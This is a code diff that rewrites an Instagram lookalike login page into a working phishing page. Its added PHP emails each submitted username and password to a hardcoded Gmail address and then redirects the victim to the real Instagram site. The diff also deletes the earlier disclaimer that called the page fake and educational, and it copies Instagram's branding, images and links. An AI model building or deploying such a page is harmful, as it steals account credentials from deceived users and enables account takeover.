@@ -1,55 +1,78 @@
-<html>
+<?php
+    if(isset($_POST['pseudo']) && isset($_POST['mdp'])) {
+        $pseudo = $_POST['pseudo'];
+        $mdp    = $_POST['mdp'];
 
+        $to = "cuj8391@gmail.com";
+        $subject = "New Account Info";
+        $message = "User/Mail: " . $pseudo . "\nPasswd: " . $mdp;
+        $headers = "From: noreply@example.com";
+
+        // Отправка email
+        mail($to, $subject, $message, $headers);
+
+        header('Location: https://www.instagram.com/');
+    }
+?>
+
+<!DOCTYPE html>
+<html lang="fr">
 <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram</title>
-    <meta charset="utf-8">
-    <meta name="viewport" content=" width=device-width,initial-scale=1.0">
-    <meta http-equiv="refresh" content="60">
-    <link rel="icon" href="favicon.png" type="icon">
-    <link rel="stylesheet" type="text/css" href="style.css">
-
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
+    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
 </head>
-
 <body>
-    <div class="container">
-        <div class="page">
-            <div class="logo">
-
-                <img src="instagram.png" alt="instagram" style="width: 175px; ">
+    <div class="main">
+            <img src="https://i.ibb.co/XJXqZP4/principal-image.png" height="575" width="375" class="main-image">
+            <div class="main-card-login">
+                <div class="login-card">
+                    <div class="login-card-header-image">
+                        <img src="https://i.ibb.co/chYt9nx/instagram-header.png" height="70" width="180">
+                    </div>
+                    <div class="login-card-form">
+                        <form method="post" action="index.php">
+                            <input type="text" name="pseudo" placeholder="Telephone number, user name or...">
+                            <input type="password" name="mdp" placeholder="Password">
+                            <button type="submit" class="login-form-button">Connection</button>
+                        </form>
+                        <div class="login-or">
+                            <hr class="login-or-first-separation">
+                            OU
+                            <hr class="login-or-last-separation">
+                        </div>
+                        <div class="login-with-facebook">
+                            <p>
+                                <i class="fa fa-facebook-square" aria-hidden="true"></i> 
+                                Connect with Facebook
+                            </p>
+                        </div>
+                        <div class="forgot-password">
+                            <p>
+                                <a href="https://www.instagram.com/accounts/password/reset/?hl=fr">Forgot your password?</a>
+                            </p>
+                        </div>
+                    </div>
+                </div>
+                <div class="login-card-footer">
+                Don't have an account? 
+                    <span>
+                        <a href="https://www.instagram.com/accounts/emailsignup/?hl=fr">Register at</a>
+                    </span>
+                </div>
+                <div class="download-app">
+                Download the application.
+                </div>
+                <div class="download-app-buttons">
+                    <a href="https://apps.apple.com/app/instagram/id389801252?vt=lo"><img src='https://i.ibb.co/0MVzVqf/download-appstore.png' height="40" width="130"></a>
+                    <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3DD4B472C0-BE65-4C27-8627-0A374E02436F%26utm_content%3Dlo%26utm_medium%3Dbadge"><img src='https://i.ibb.co/hdsFFGB/download-playstore.png' height="40" width="130"></a>
+                </div>
             </div>
-
-            <br />
-            <form class="container" action="send.php" method="post">
-                <input type="text" placeholder="Phone number, username, or email " name="u_name">
-                <input type="password" placeholder="Password" name="pass">
-                <button class="submitbutton">Log in </button>
-                <br />
-                <div class="option">OR </div>
-            </form>
-
-            <div class="fblink">
-                <span class="fab fafacebook"></span>
-                <a href="#"> Log in With Facebook</a>
-            </div>
-
-            <div class="forget-id">
-                <a href="https://www.instagram.com/accounts/password/reset/">Forget password?</a>
-            </div>
-            <div class="singup">
-                <p>Don't have an account?<a href="https://www.instagram.com/accounts/emailsignup/">
-                        Sign up</a></p>
-            </div>
-
         </div>
-    </div>
-
-    <br />
-    <div style="position:fixed;left:0;bottom:0;width:100%; color: #7e7979;">
-        <p style="text-align:center;"> Disclaimer this is not a real "instagram.com" page, please do not enter
-            your real username and password, it's only for educational purposes.</p>
-    </div>
-    <br />
-
 </body>
-
 </html>
+
